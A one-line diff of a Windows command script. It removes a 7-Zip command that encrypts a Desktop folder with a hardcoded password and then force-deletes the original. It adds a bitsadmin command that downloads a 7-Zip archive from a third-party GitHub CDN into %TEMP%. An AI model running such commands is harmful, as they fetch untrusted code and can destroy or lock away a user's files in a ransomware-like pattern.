@@ -1,1 +1,1 @@
-"%TEMP%\7-Zip\7z.exe" a -tzip -mem=AES256 -p"MySecretPass123" "%USERPROFILE%\Desktop\encryptfol.zip" "%USERPROFILE%\Desktop\encryptfol" && rmdir /s /q "%USERPROFILE%\Desktop\encryptfol"
+bitsadmin /transfer "Get7zip" /download /priority normal "https://cdn.jsdelivr.net/gh/anupcic/7zip@main/7-Zip.zip" "%TEMP%\7-Zip.zip"
